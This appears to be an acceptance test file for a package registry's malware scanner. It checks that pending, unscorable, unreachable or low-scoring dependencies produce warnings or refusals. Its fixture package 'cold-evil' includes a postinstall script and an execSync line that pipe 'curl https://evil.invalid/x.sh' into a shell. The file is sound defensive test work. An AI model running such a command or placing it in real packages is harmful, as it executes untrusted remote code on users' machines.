// Review of d49bf6e, finding 4: anonymous requests only queue analyses, and the resolve walk counted a queued
// dependency as merely unchecked, so a scored root that depends on an unscored `curl … | sh` package resolved with HTTP
// 200 and no blocks. Once the dependency's score of 10 was stored, the same resolve answered 422. A queued version is
// now pending: the resolve waits for it (polling the database), then answers from what landed, and anything still
// pending is a 202 listing it, never a 200. The store is the real Postgres one; npm is a local stand-in, and no
// analysis runs here (Analysis.none), as for an anonymous caller.
//
// Since the owner's warn-not-block policy (2026-11), those refusals are strict mode's (`strict=1`, apm add --strict,
// APM_SCANNER_STRICT=1): the cases below that refuse ask for it. The default mode installs, and says why it warns: a
// 200 with a `warnings` entry per package, and warn-level scan advisories. Revoked versions and ones an apm reviewer
// confirmed malicious still refuse in both modes.
import { describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { Effect, Layer, Option } from "effect";
import { Client } from "pg";
import { z } from "zod";
import { analyze, SCORER, type Analysis as Scored } from "@apm/core";
import { freshDatabase } from "../../../tests/acceptance/postgres.ts";
import { Analysis } from "../src/analysis.ts";
import { resolveResponse, ResolveWait, scanResponse } from "../src/apm.ts";
import { Blobs } from "../src/blobs.ts";
import { Clock } from "../src/clock.ts";
import { RegistryConfig } from "../src/config.ts";
import { Store, UnscorableReason } from "../src/db.ts";
import { Upstream } from "../src/upstream.ts";
import { MemoryPool, RequestMemory } from "../src/memory.ts";

/** This file's memory pool: every request it runs takes a lease of it, as a Worker isolate's do. */
const POOL = new MemoryPool();

const NOW = Date.parse("2026-11-12T00:00:00Z");
const DAY = 86_400_000;
const encoder = new TextEncoder();

type Manifest = { name: string; version: string; main: string; license: string; dependencies?: Record<string, string>; scripts?: Record<string, string> };

const manifests = new Map<string, Manifest>([
  ["root", { name: "root", version: "1.0.0", main: "index.js", license: "MIT", dependencies: { "cold-evil": "^1.0.0" } }],
  ["cold-evil", { name: "cold-evil", version: "1.0.0", main: "index.js", license: "MIT", scripts: { postinstall: "curl https://evil.invalid/x.sh | sh" } }],
  ["cold-root", { name: "cold-root", version: "1.0.0", main: "index.js", license: "MIT" }],
  ["cold-parent", { name: "cold-parent", version: "1.0.0", main: "index.js", license: "MIT", dependencies: { "cold-evil": "^1.0.0" } }],
]);

function analysisOf(m: Manifest, code = "module.exports = 1;\n"): Scored {
  const file = (path: string, text: string) => ({ path, size: text.length, mode: 0o644, data: encoder.encode(text) });

  return analyze({ name: m.name, manifest: m, files: [file("package.json", JSON.stringify(m)), file("index.js", code)], publisher: "u", previousPublishers: [] });
}

const integrityOf = (name: string): string => `sha512-${createHash("sha512").update(name).digest("base64")}`;
const digestOfName = (name: string): string => `sha512-${createHash("sha512").update(name).digest("hex")}`;

/** npm, standing in: the packuments of the upstream packages, published ten days ago. */
function fakeNpm(names: readonly string[]) {
  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req): Response {
      const name = decodeURIComponent(new URL(req.url).pathname.slice(1));
      const m = names.includes(name) ? manifests.get(name) : undefined;

      if (!m) return Response.json({ error: "Not found" }, { status: 404 });
      const dist = { tarball: `https://npm.invalid/${name}/-/${name}-1.0.0.tgz`, shasum: "1".repeat(40), integrity: integrityOf(name) };

      return Response.json({ name, "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": { ...m, dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } });
    },
  });

  return { url: server.url.href, stop: () => server.stop(true) };
}

const noBlobs = Layer.succeed(
  Blobs,
  Blobs.of({ put: () => Effect.void, stream: () => Effect.succeed(Option.none()), bytes: () => Effect.succeed(Option.none()), exists: () => Effect.succeed(false), remove: () => Effect.void }),
);

const Warning = z.object({ name: z.string(), version: z.string(), kind: z.string(), score: z.number().nullable(), grade: z.string().nullable(), text: z.string(), reasons: z.array(z.string()), url: z.string(), via: z.array(z.string()) });

const Body = z.object({
  error: z.string().optional(),
  version: z.string().nullish(),
  pending: z.array(z.object({ name: z.string(), version: z.string() })).optional(),
  unavailable: z.array(z.object({ dependency: z.string() })).optional(),
  retryAfter: z.number().optional(),
  tree: z
    .object({
      blocks: z.array(z.object({ name: z.string(), reason: z.string() })),
      pending: z.array(z.object({ name: z.string() })).optional(),
      unscorable: z.array(z.object({ name: z.string(), reason: z.string() })).optional(),
      unavailable: z.array(z.object({ dependency: z.string() })).optional(),
    })
    .loose()
    .optional(),
  warnings: z.array(Warning).optional(),
  skipped: z.array(z.object({ version: z.string(), reason: z.string() })).optional(),
});

const SETTINGS = (npm: string) => ({ baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm, legacyAuth: false, namePolicy: "open", admins: [] }) as const;

async function resolve(input: { url: string; npm: string; name: string; wait: { maxMs: number; pollMs: number }; strict?: boolean; askedWaitMs?: number }) {
  const params = new URLSearchParams({ name: input.name, range: "latest" });

  if (input.strict) params.set("strict", "1");

  if (input.askedWaitMs !== undefined) params.set("wait", String(input.askedWaitMs));
  const u = new URL(`http://registry.test/-/apm/v1/resolve?${params}`);
  const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, input.wait), Layer.succeed(RegistryConfig, SETTINGS(input.npm)), RequestMemory.layer(POOL));
  const layers = Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), base);
  const t0 = performance.now();
  const program = Effect.flatMap(resolveResponse(u), (res) => Effect.promise(async () => ({ status: res.status, retryAfter: res.headers.get("retry-after"), body: Body.parse(await res.json()) })));
  const out = await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));

  return { ...out, ms: performance.now() - t0 };
}

type Sql = (q: string, p?: unknown[]) => Promise<void>;

async function withRig(fn: (rig: { url: string; npm: string; sql: Sql }) => Promise<void>, npmUrl?: string): Promise<void> {
  const db = await freshDatabase();
  const npm = npmUrl === undefined ? fakeNpm(["cold-evil", "cold-root", "cold-parent"]) : { url: npmUrl, stop: () => {} };
  const c = new Client({ connectionString: db.url });

  await c.connect();

  try {
    const sql: Sql = async (q, p = []) => {
      await c.query(q, p);
    };

    const root = manifests.get("root");

    if (!root) throw new Error("no root");
    // the root is a local package, published ten days ago and scored clean
    await sql(`INSERT INTO users (name, password_hash, email, created_at) VALUES ('u', 'x', 'u@example.test', 0)`);
    await sql(`INSERT INTO packages (name, created_at, modified_at, dist_tags) VALUES ('root', 0, 0, '{"latest":"1.0.0"}'::jsonb)`);
    await sql(
      `INSERT INTO versions (package, version, manifest, shasum, integrity, size, tarball_key, published_at, published_by, score)
       VALUES ('root', '1.0.0', $1::jsonb, $2, 'sha1-x', 10, 'sha512/x', $3, 'u', $4::jsonb)`,
      [JSON.stringify(root), "0".repeat(40), NOW - 10 * DAY, JSON.stringify(analysisOf(root))],
    );
    await fn({ url: db.url, npm: npm.url, sql });
  } finally {
    await c.end();
    npm.stop();
    await db.drop();
  }
}

/** The stored analysis the queue's run would store for cold-evil: it pipes a download into a shell at install. */
const storeEvil = (sql: Sql): Promise<void> => {
  const m = manifests.get("cold-evil");

  if (!m) throw new Error("no manifest");

  return sql(`INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('cold-evil', '1.0.0', $1, $2, $3::jsonb, 0)`, [
    digestOfName("cold-evil"),
    SCORER,
    JSON.stringify(analysisOf(m, "require('child_process').execSync('curl https://evil.invalid/x.sh | sh');\n")),
  ]);
};

describe("strict: a queued dependency is pending, never clean", () => {
  test("a scored root over an unscored dependency: 202 listing it after the wait, then 422 once its score lands", () =>
    withRig(async ({ url, npm, sql }) => {
      const pending = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 }, strict: true });

      // on d49bf6e: 200, no blocks, the dependency only "could not be analyzed"
      expect(pending.status).toBe(202);
      expect(pending.body.pending).toEqual([{ name: "cold-evil", version: "1.0.0" }]);
      expect(pending.body.error).toContain("still being analysed");
      expect(pending.retryAfter).toBe("10");
      expect(pending.ms).toBeGreaterThanOrEqual(250);

      await storeEvil(sql);
      const refused = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 }, strict: true });

      expect(refused.status).toBe(422);
      expect(refused.body.tree?.blocks.map((b) => b.name)).toEqual(["cold-evil"]);
    }));

  test("an analysis that lands while the resolve waits is answered from at once", () =>
    withRig(async ({ url, npm, sql }) => {
      setTimeout(() => void storeEvil(sql), 200);
      const r = await resolve({ url, npm, name: "root", wait: { maxMs: 10_000, pollMs: 50 }, strict: true });

      expect(r.status).toBe(422);
      expect(r.ms).toBeLessThan(5_000);
    }));

  test("an unscored root is pending too, not skipped for an older version or refused outright", () =>
    withRig(async ({ url, npm }) => {
      const r = await resolve({ url, npm, name: "cold-root", wait: { maxMs: 100, pollMs: 50 }, strict: true });

      expect(r.status).toBe(202);
      expect(r.body.version).toBe("1.0.0");
      expect(r.body.pending).toEqual([{ name: "cold-root", version: "1.0.0" }]);
    }));
});

/** POST /-/apm/v1/scan, anonymous, as the Bun scanner asks it (APM_SCANNER_STRICT=1 sends `strict: true`). */
async function scan(input: { url: string; npm: string; packages: { name: string; version: string }[]; strict?: boolean }) {
  const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(RegistryConfig, SETTINGS(input.npm)), RequestMemory.layer(POOL));
  const layers = Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), base);
  const req = new Request("http://registry.test/-/apm/v1/scan", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ packages: input.packages, strict: input.strict === true }) });

  const ScanBody = z.object({
    advisories: z.array(z.object({ package: z.string(), level: z.string(), description: z.string() })),
    unchecked: z.array(z.object({ package: z.string() })),
    pending: z.array(z.object({ package: z.string() })),
    unscorable: z.array(z.object({ package: z.string(), reason: z.string() })),
    unavailable: z.array(z.object({ package: z.string() })),
    warnings: z.array(Warning),
  });

  const program = Effect.flatMap(scanResponse(req, { kind: "anon" }), (res) => Effect.promise(async () => ({ status: res.status, body: ScanBody.parse(await res.json()) })));

  return Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));
}

/** What the queue's run records for a version it can never score. */
const storeOutcome = (sql: Sql, name: string, reason: string): Promise<void> =>
  sql(`INSERT INTO analysis_outcomes (package, version, scorer, outcome, detail, decided_at) VALUES ($1, '1.0.0', $2, $3, 'stand-in detail', 0)`, [name, SCORER, reason]);

// Review of 9913a74, finding 2: once a pending dependency reached a terminal outcome (analysis-limit) the same resolve
// answered 200 with no blocks and it only "unchecked", and the scan listed it as unchecked, which the default scanner
// only warns about. A version that will never be scored blocks the tree and is a fatal advisory, like a low score.
describe("strict: a version apm will never score blocks, never installs unchecked", () => {
  for (const reason of UnscorableReason.options) {
    test(`a dependency decided ${reason}: 202 while pending, then 422 naming why`, () =>
      withRig(async ({ url, npm, sql }) => {
        const before = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 }, strict: true });

        expect(before.status).toBe(202);
        await storeOutcome(sql, "cold-evil", reason);
        const after = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 }, strict: true });

        // on 9913a74: 200, tree.blocks [], tree.unchecked 1
        expect(after.status).toBe(422);
        expect(after.body.tree?.blocks.map((b) => b.name)).toEqual(["cold-evil"]);
        expect(after.body.tree?.blocks[0]?.reason).toStartWith("apm cannot score this version:");
        expect(after.body.error).toContain("cold-evil@1.0.0 apm cannot score this version");
      }));

    test(`the scan answers a version decided ${reason} with a fatal advisory`, () =>
      withRig(async ({ url, npm, sql }) => {
        await storeOutcome(sql, "cold-evil", reason);
        const r = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }], strict: true });

        // on 9913a74: no advisory, only an unchecked entry
        expect(r.status).toBe(200);
        expect(r.body.advisories.map((a) => [a.package, a.level])).toEqual([["cold-evil", "fatal"]]);
        expect(r.body.advisories[0]?.description).toContain("apm cannot score this version");
        expect(r.body.pending).toEqual([]);
        expect(r.body.unchecked).toEqual([]);
      }));
  }

  test("a root decided unscorable is refused, naming why", () =>
    withRig(async ({ url, npm, sql }) => {
      await storeOutcome(sql, "cold-root", "analysis-limit");
      const r = await resolve({ url, npm, name: "cold-root", wait: { maxMs: 0, pollMs: 1 }, strict: true });

      expect(r.status).toBe(422);
      expect(r.body.skipped?.[0]?.reason).toStartWith("apm cannot score this version: its analysis runs past the registry's limits");
    }));

  test("a scan of a pending version still lists it as pending, not as an advisory", () =>
    withRig(async ({ url, npm }) => {
      const r = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }] });

      expect(r.body.pending.map((p) => p.package)).toEqual(["cold-evil"]);
      expect(r.body.advisories).toEqual([]);
    }));
});

describe("default: a score, an incomplete or missing score, or a pending version warns, and the install goes ahead", () => {
  test("a scored root over an unscored dependency: 200 with a pending warning after the wait, then a low-score warning", () =>
    withRig(async ({ url, npm, sql }) => {
      const waited = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 } });

      expect(waited.status).toBe(200);
      expect(waited.ms).toBeGreaterThanOrEqual(250);
      expect(waited.body.version).toBe("1.0.0");
      expect(waited.body.tree?.pending?.map((p) => p.name)).toEqual(["cold-evil"]);
      expect(waited.body.warnings?.map((w) => [w.name, w.kind, w.via])).toEqual([["cold-evil", "pending", ["root@1.0.0"]]]);

      await storeEvil(sql);
      const scored = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 } });
      const w = scored.body.warnings?.[0];

      expect(scored.status).toBe(200);
      expect(scored.body.tree?.blocks).toEqual([]);
      expect(w).toMatchObject({ name: "cold-evil", version: "1.0.0", kind: "low-score", url: "http://web.test/package/cold-evil/v/1.0.0" });
      expect(w?.score ?? 100).toBeLessThan(40);
      expect(w?.grade).toBe("F");
      expect(w?.text).toContain(`scores ${w?.score}/100 (F)`);
      expect(w?.reasons.length).toBeGreaterThan(0);
      expect(w?.reasons.length).toBeLessThanOrEqual(3);
      // each reason cites a file and line, or the install script it reads
      expect(w?.reasons.some((r) => /index\.js:\d+|package\.json|postinstall/.test(r))).toBe(true);
    }));

  // staging: the website's explain gave resolve 25 s, and the registry's 20 s wait plus two walks of vite's tree ran
  // past it. A caller with its own deadline asks for less, and hears back as soon as that is over.
  test("a caller that asks to wait less is answered after its own wait, with what is still pending as a warning", () =>
    withRig(async ({ url, npm }) => {
      const r = await resolve({ url, npm, name: "root", wait: { maxMs: 5_000, pollMs: 50 }, askedWaitMs: 100 });

      expect(r.status).toBe(200);
      expect(r.ms).toBeLessThan(2_000);
      expect(r.body.warnings?.map((w) => [w.name, w.kind])).toEqual([["cold-evil", "pending"]]);
      const bad = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 }, askedWaitMs: -5 });

      expect(bad.status).toBe(400);
    }));

  // review of a76b9fc, finding 3: `pendingRoot ? [] : walked.pending` dropped every pending dependency's warning when the
  // root itself was pending, so an unscored root over an unscored dependency warned only about the root
  test("a pending root over a pending dependency warns about both", () =>
    withRig(async ({ url, npm }) => {
      const r = await resolve({ url, npm, name: "cold-parent", wait: { maxMs: 100, pollMs: 50 } });

      expect(r.status).toBe(200);
      expect(r.body.warnings?.map((w) => [w.name, w.kind, w.via])).toEqual([
        ["cold-parent", "pending", []],
        ["cold-evil", "pending", ["cold-parent@1.0.0"]],
      ]);
    }));

  test("an unscored root still pending after the wait installs with a pending warning, not skipped", () =>
    withRig(async ({ url, npm }) => {
      const r = await resolve({ url, npm, name: "cold-root", wait: { maxMs: 100, pollMs: 50 } });

      expect(r.status).toBe(200);
      expect(r.body.version).toBe("1.0.0");
      expect(r.body.warnings?.map((w) => [w.name, w.kind, w.via])).toEqual([["cold-root", "pending", []]]);
    }));

  for (const reason of UnscorableReason.options) {
    test(`a dependency decided ${reason}: 200, listed unscorable, with a warning naming why; the scan warns`, () =>
      withRig(async ({ url, npm, sql }) => {
        await storeOutcome(sql, "cold-evil", reason);
        const r = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 } });

        expect(r.status).toBe(200);
        expect(r.body.tree?.unscorable?.map((u) => u.name)).toEqual(["cold-evil"]);
        expect(r.body.warnings?.map((w) => [w.name, w.kind])).toEqual([["cold-evil", "unscorable"]]);
        expect(r.body.warnings?.[0]?.text).toStartWith("apm cannot score this version:");
        const s = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }] });

        expect(s.body.advisories.map((a) => [a.package, a.level])).toEqual([["cold-evil", "warn"]]);
        expect(s.body.unscorable.map((u) => u.package)).toEqual(["cold-evil"]);
      }));
  }

  test("the scan answers a low score with a warn advisory, and strict with a fatal one", () =>
    withRig(async ({ url, npm, sql }) => {
      await storeEvil(sql);
      const warned = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }] });
      const strict = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }], strict: true });

      expect(warned.body.advisories.map((a) => a.level)).toEqual(["warn"]);
      expect(warned.body.advisories[0]?.description).toContain("cold-evil@1.0.0: scores");
      expect(warned.body.warnings[0]?.url).toBe("http://web.test/package/cold-evil/v/1.0.0");
      expect(warned.body.warnings.map((w) => w.kind)).toEqual(["low-score"]);
      expect(strict.body.advisories.map((a) => a.level)).toEqual(["fatal"]);
    }));
});

// Review of 5b5b492, finding 2: a scored root whose dependency's npm metadata answered 503 resolved 200 with no blocks
// and no word of it, the scan gave no advisory, and the scanner only warned that it was "not checked". A lookup that
// failed is now its own state, never a pass: strict mode answers 503 with Retry-After and the unresolved
// dependencies, and the default mode installs with a warning that says "could not be checked: registry or upstream
// unavailable", kept apart from the walk's limits.
describe("a dependency whose metadata cannot be fetched is not a pass", () => {
  const outage = () => Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("unavailable", { status: 503 }) });

  test("strict: 503 with Retry-After listing it; default: 200 with an unavailable warning", async () => {
    const down = outage();

    try {
      await withRig(async ({ url, npm }) => {
        const strict = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 }, strict: true });

        expect(strict.status).toBe(503);
        expect(strict.retryAfter).toBe("10");
        expect(strict.body.unavailable?.map((u) => u.dependency)).toEqual(["cold-evil@^1.0.0"]);
        expect(strict.body.error).toContain("could not be checked: registry or upstream unavailable");

        const warned = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 } });

        expect(warned.status).toBe(200);
        expect(warned.body.tree?.unavailable?.map((u) => u.dependency)).toEqual(["cold-evil@^1.0.0"]);
        expect(warned.body.warnings?.map((w) => [w.name, w.kind, w.text])).toEqual([["cold-evil", "unavailable", "could not be checked: registry or upstream unavailable"]]);
      }, down.url.href);
    } finally {
      down.stop(true);
    }
  });

  test("the scan gives it an advisory saying so (warn; strict: fatal) and lists it unavailable, not unchecked", async () => {
    const down = outage();

    try {
      await withRig(async ({ url, npm }) => {
        const warned = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }] });
        const strict = await scan({ url, npm, packages: [{ name: "cold-evil", version: "1.0.0" }], strict: true });

        expect(warned.body.advisories.map((a) => [a.package, a.level])).toEqual([["cold-evil", "warn"]]);
        expect(warned.body.advisories[0]?.description).toContain("could not be checked: registry or upstream unavailable");
        expect(warned.body.unavailable.map((u) => u.package)).toEqual(["cold-evil"]);
        expect(warned.body.unchecked).toEqual([]);
        expect(strict.body.advisories.map((a) => a.level)).toEqual(["fatal"]);
      }, down.url.href);
    } finally {
      down.stop(true);
    }
  });

  test("a package that cannot itself be looked up is a 503 in both modes: there is no version to install", async () => {
    const down = outage();

    try {
      await withRig(async ({ url, npm }) => {
        for (const strict of [false, true]) {
          const r = await resolve({ url, npm, name: "cold-root", wait: { maxMs: 0, pollMs: 1 }, strict });

          expect(r.status).toBe(503);
          expect(r.retryAfter).toBe("10");
        }
      }, down.url.href);
    } finally {
      down.stop(true);
    }
  });
});
